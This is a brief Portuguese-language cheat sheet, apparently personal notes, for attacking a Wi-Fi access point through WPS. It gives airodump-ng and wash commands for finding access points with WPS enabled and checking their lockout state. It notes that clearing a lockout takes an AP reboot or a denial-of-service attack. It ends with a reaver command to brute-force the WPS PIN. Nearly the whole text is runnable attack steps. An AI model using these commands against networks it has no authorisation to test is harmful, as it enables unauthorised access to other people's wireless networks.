# Ativar botão físico WPS no equipamento. WPS ou QSS
# Inicia-se o prazo de dois minutos para realizar o ataque.

# 1) Iniciar monitoramento:
# 2) Identificar AP com WPS ativo:
airodump-ng [interface de monitoramento] --wps
# Ou utilizar wash para verificar campo LCK:
# (Bloqueia acessos por tentativas de login)
# Requer reboot do AP ou ataque DoS que o cause.
wash -i [interface]
# 3) Quebrar PIN com Reaver:
# -i: interface
# -b: BSSID
# -c: Canal
# -vv: verbose
# --no-nacks: ignora mensagens de erro
reaver -i [interface] -c 1 -b [BSSID] -vv --no-nacks
